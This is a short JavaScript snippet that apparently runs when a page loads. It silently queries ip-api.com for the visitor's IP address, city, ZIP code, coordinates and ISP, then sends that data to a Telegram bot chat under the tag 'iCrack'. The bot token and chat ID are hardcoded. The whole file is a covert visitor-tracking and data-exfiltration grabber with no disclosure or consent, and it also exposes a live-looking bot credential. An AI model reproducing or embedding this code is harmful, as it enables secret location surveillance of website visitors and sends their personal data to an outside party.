let bot = {
TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
chatID: "-1001590122992",
}

const api_url = 'http://ip-api.com/json/?fields=country,regionName,city,zip,lat,lon,timezone,isp,query'
async function getISS() {
	const response = await fetch(api_url);
	const data = await response.json();
	var my_text = `iCrack:%0A - IP Address: ${data.query} %0A - City: ${data.city} %0A - State: ${data.regionName} %0A - ZIP: ${data.zip} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone} %0A - Latitude: ${data.lat} %0A - Longitude: ${data.lon} %0A - ISP: ${data.isp}`

	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
	method: "GET"
})
}

getISS();